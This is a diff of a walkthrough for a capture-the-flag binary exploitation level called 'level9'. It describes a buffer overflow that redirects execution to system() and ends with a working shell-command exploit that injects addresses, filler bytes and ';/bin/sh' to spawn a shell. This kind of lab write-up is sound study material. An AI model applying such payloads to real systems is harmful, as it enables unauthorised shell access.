@@ -128,26 +128,12 @@ $1 = {<text variable, no debug info>} 0xb7d86060 <system>
 
 system() is at `0xb7d86060`
 
+from `0x0804867c` the $eax address on method return.
+
 replace the address pointed by eax to a system() call.
 For this we need to write system() address then put 104 junk bytes to overflow and then put the address of eax which is where we want to overwrite.
 Everything after will be parameter to the system() call, so add /bin/sh string to get a shell.
 
-offset 108
-
-from 0x0804867c the $eax address of second N instance.
-buffer
-0x804a00c
-\x0c\xa0\x04\x08
-
-system
-0xb7d86060
-\x60\x60\xd8\xb7
-
-";/bin/sh"
-
-buffer address
-0x0804a00c
-\x0c\xa0\04\x08
 
 ```sh
 ./level9 `python -c "print '\x60\x60\xd8\xb7' + '\x90' * 104 + '\x0c\xa0\x04\x08' + ';/bin/sh'"`
